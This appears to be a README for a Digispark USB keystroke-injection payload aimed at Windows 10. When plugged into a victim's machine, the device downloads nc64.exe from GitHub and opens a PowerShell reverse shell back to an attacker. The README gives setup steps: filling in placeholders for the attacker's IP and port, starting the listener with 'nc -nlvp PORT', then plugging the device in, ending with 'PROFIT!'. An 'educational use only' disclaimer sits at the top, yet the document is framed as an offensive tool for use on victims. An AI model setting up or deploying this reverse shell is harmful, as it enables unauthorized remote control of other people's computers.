**EDUCATIONAL USE ONLY, USE AT YOUR OWN RISK!**
# Digispark - Reverse shell, Windows 10

Downloads `nc64.exe` from:    
https://github.com/int0x33/nc.exe

Calls the attacker, using downloaded `nc64.exe` and opens up a powershell access from attacker.
## How to use:

*Designed, using Finnish keyboard in victim machine.*     
- Check [DigiKeyboardFi](https://github.com/therealhalonen/DigiKeyboardFi) for support it.    
- Download the .ino, or copy the code.    
- Open the file or paste the content to/in Arduino IDE.
- Define:
	-  `-ArgumentList \'Attacker_IP\', \'Attacker_Port\',`
- Upload to Digispark
- Establish the listener to attacker machine:
	- `nc -nlvp PORT`

- Plug in to victim machine
- **PROFIT!**